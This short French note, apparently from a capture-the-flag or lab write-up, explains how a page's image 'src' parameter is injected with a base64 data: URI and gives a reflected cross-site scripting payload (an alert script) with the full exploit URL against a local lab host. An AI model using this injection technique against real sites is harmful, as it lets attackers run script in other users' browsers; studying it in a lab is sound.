@@ -1,0 +1,4 @@
+Sur la page media, on peut voir que l'image nsa est chargee en GET. Il suffit de faire passer un script javascript pour une image pour la charger. J'ai donc encode en base64: 
+<script>alert(coucou)</script>
+
+http://10.1.1.5/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChjb3Vjb3UpPC9zY3JpcHQ+
